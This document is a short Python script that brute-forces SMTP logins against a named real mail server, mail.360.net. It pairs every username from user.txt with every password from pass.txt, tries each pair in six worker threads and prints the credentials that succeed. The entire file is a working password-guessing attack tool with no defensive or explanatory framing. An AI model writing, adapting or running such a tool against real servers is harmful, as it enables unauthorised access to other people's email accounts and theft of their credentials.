#coding:utf-8

import smtplib
import threading
from queue import Queue


mail_host = "mail.360.net"



def run():
    while True:
        u,p = q.get()
        try:
            smtp = smtplib.SMTP(mail_host)
            smtp.login(u,p)
            smtp.quit()
            print('{} : {} ok'.format(u,p))
        except Exception as e:
            pass
        finally:
            q.task_done()

q = Queue()
threads = []

for i in range(6):
    t = threading.Thread(target=run)
    threads.append(t)
for t in threads:
    t.setDaemon(True)
    t.start()





with open('user.txt') as users:
    for u in users:
        u = u.strip()
        # print(u)
        with open('pass.txt') as passwords:
            for p in passwords:
                p = p.strip()
                # print(p)
                q.put((u,p))
q.join()
